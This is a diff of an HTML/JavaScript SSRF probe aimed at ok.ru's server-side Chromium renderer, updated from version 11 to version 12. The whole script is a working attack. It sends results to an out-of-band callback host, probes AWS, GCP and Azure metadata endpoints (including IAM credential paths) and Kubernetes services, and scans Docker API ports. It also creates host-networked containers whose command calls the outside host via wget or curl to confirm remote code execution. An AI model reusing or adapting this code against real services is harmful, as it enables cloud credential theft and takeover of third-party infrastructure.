@@ -4,17 +4,15 @@
 <body>
 <script>
 'use strict';
-// ok.ru Chromium SSRF — probe v11
-// KEY CHANGES:
-// - HTTPS OOB (works on 217.20.158.245 node; DNS also fires on short-lived nodes)
-// - Phase 1: Start v10 containers IMMEDIATELY (sync) — they may exist from v10 creates
-// - Phase 2: Port scan with 1400ms timeout (results arrive within 2s page lifetime)
-// - Phase 3: Fresh create+start with 300ms start delay
+// ok.ru Chromium SSRF — probe v12
+// KEY CHANGES from v11:
+// - Cloud metadata probes (IMDS AWS/GCP/Azure) — PNA disabled on 217.20.158.245
+// - Kubernetes default service probe
+// - Keep Docker attempts (start v10+v11 containers + fresh v12 creates)
+// - 1800ms scan timeout (2s page lifetime on long node)
 
 const OOB = 'd9ma5ob6b8m83c3a34k09c5rm5nk11f7g.oast.pro';
 const clean = s => String(s).toLowerCase().replace(/[^a-z0-9-]/g,'').replace(/-+/g,'-').replace(/^-|-$/g,'').substring(0,55);
-
-// HTTPS OOB — DNS fires immediately; HTTP arrives once TLS established (~500ms)
 const oob = label => { new Image().src = `https://${clean(label)}.${OOB}/`; };
 
 const ffPost = (id, url, body) => {
@@ -37,64 +35,71 @@ const ffPost = (id, url, body) => {
   } catch(e) {}
 };
 
-oob(`v11-s-${clean(navigator.userAgent.substring(20,40))}`);
+oob(`v12-s-${clean(navigator.userAgent.substring(20,40))}`);
 
 const rceCmd = `nslookup rce-ok.${OOB}; wget -qT5 "http://rce-ok.${OOB}/?h=$(hostname|head -c20)" 2>/dev/null || curl -sm5 "http://rce-ok.${OOB}/?h=$(hostname|head -c20)"`;
 
-// ── Phase 1: Start v10 containers IMMEDIATELY (sync) ──────────────────────
-// v10 creates used names v{hi}{pi}{ii} at specific endpoints:
-const V10 = [
-  ['127.0.0.1', 2375, ['v000','v001']],
-  ['127.0.0.1', 4243, ['v010','v011']],
-  ['172.17.0.1', 2375, ['v100','v101']],
-  ['172.17.0.1', 4243, ['v110','v111']],
+// ── Phase 1: Start previous containers (sync) ──────────────────────────────
+const OLD = [
+  ['127.0.0.1', 2375, ['v000','v001','x0000','x0001']],
+  ['127.0.0.1', 4243, ['v010','v011','x0100','x0101']],
+  ['172.17.0.1', 2375, ['v100','v101','x1000','x1001']],
+  ['172.17.0.1', 4243, ['v110','v111','x1100','x1101']],
 ];
 let idx = 0;
-V10.forEach(([ip, p, names]) => names.forEach(nm => {
-  oob(`s10-${nm}`);
+OLD.forEach(([ip, p, names]) => names.forEach(nm => {
   ffPost(`s${idx++}`, `http://${ip}:${p}/v1.41/containers/${nm}/start`, null);
 }));
 
-// ── Phase 2: Port scan via fetch — results arrive via HTTPS OOB callbacks ──
-const scan = (tag, url, ms) => {
-  fetch(url, { mode:'no-cors', signal: AbortSignal.timeout(ms) })
-    .then(() => oob(`${tag}-o`))
-    .catch(e => oob(`${tag}-${e.name==='TimeoutError'?'t':'e'}`));
+// ── Phase 2: Cloud metadata probes (PNA disabled = link-local accessible) ──
+const scanFetch = (tag, url, ms, hdrs={}) => {
+  fetch(url, { mode:'no-cors', signal: AbortSignal.timeout(ms), headers: hdrs })
+    .then(r => { oob(`${tag}-${r.status}`); return r.text(); })
+    .then(b => oob(`${tag}-b-${clean(b.substring(0,20))}`))
+    .catch(e => oob(`${tag}-${e.name==='TimeoutError'?'t':clean((e.message||e.name||'e').substring(0,10))}`));
 };
-['127.0.0.1','172.17.0.1'].forEach(ip => [2375,4243,6379,8080].forEach(p => {
-  scan(`sk-${ip.split('.').pop()}-${p}`, `http://${ip}:${p}/`, 1400);
+
+// AWS IMDS v1 (no auth needed)
+scanFetch('aws-imds', 'http://169.254.169.254/latest/meta-data/', 1500);
+scanFetch('aws-ami', 'http://169.254.169.254/latest/meta-data/ami-id', 1500);
+scanFetch('aws-role', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', 1500);
+// AWS IMDS v2 (needs token first — just probe if port open)
+scanFetch('aws-v2', 'http://169.254.169.254/latest/api/token', 1500, {'X-aws-ec2-metadata-token-ttl-seconds':'10'});
+
+// GCP metadata
+scanFetch('gcp-meta', 'http://metadata.google.internal/computeMetadata/v1/?recursive=true', 1500, {'Metadata-Flavor':'Google'});
+scanFetch('gcp-ip', 'http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/ip', 1500, {'Metadata-Flavor':'Google'});
+
+// Azure IMDS
+scanFetch('az-meta', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', 1500, {'Metadata':'true'});
+
+// Kubernetes default service
+scanFetch('k8s-svc', 'https://kubernetes.default.svc/', 1500);
+scanFetch('k8s-ip', 'https://10.96.0.1/', 1500);
+scanFetch('k8s-10', 'https://10.0.0.1/', 1500);
+
+// ── Phase 3: Docker port scan ──────────────────────────────────────────────
+['127.0.0.1','172.17.0.1'].forEach(ip => [2375,4243,2376].forEach(p => {
+  scanFetch(`dk-${ip.split('.').pop()}-${p}`, `http://${ip}:${p}/_ping`, 1600);
 }));
 
-// Also direct Docker ping with readable response check
-fetch('http://127.0.0.1:2375/_ping', { signal: AbortSignal.timeout(1400) })
-  .then(r => { oob(`dp-lo-${r.status}`); return r.text(); })
-  .then(b => oob(`dp-lo-body-${clean(b.substring(0,6))}`))
-  .catch(e => oob(`dp-lo-${clean((e.name||'u').substring(0,6))}`));
-
-fetch('http://172.17.0.1:2375/_ping', { signal: AbortSignal.timeout(1400) })
-  .then(r => { oob(`dp-gw-${r.status}`); return r.text(); })
-  .then(b => oob(`dp-gw-body-${clean(b.substring(0,6))}`))
-  .catch(e => oob(`dp-gw-${clean((e.name||'u').substring(0,6))}`));
-
-// ── Phase 3: Fresh creates with 300ms start delay ──────────────────────────
+// ── Phase 4: Fresh v12 creates ────────────────────────────────────────────
 const DIPS = ['127.0.0.1','172.17.0.1'];
 const DPORTS = [2375, 4243];
 DIPS.forEach((ip,hi) => DPORTS.forEach((p,pi) => {
   ['busybox','alpine'].forEach((img,ii) => {
-    const nm = `x${hi}${pi}${ii}`;
+    const nm = `y${hi}${pi}${ii}`;
     const bdy = {Image:img,Cmd:['sh','-c',rceCmd],HostConfig:{NetworkMode:'host',AutoRemove:true}};
     oob(`cr-${nm}`);
     ffPost(`c${idx++}`, `http://${ip}:${p}/v1.41/containers/create?name=${nm}`, bdy);
-    const delay = 300 + ii*100;
-    const fi = idx++;
     setTimeout(() => {
       oob(`st-${nm}`);
-      ffPost(`s${fi}`, `http://${ip}:${p}/v1.41/containers/${nm}/start`, null);
-    }, delay);
+      ffPost(`s${idx++}`, `http://${ip}:${p}/v1.41/containers/${nm}/start`, null);
+    }, 400 + ii*100);
   });
 }));
 
-oob('v11-e');
+oob('v12-e');
 </script>
 </body>
 </html>
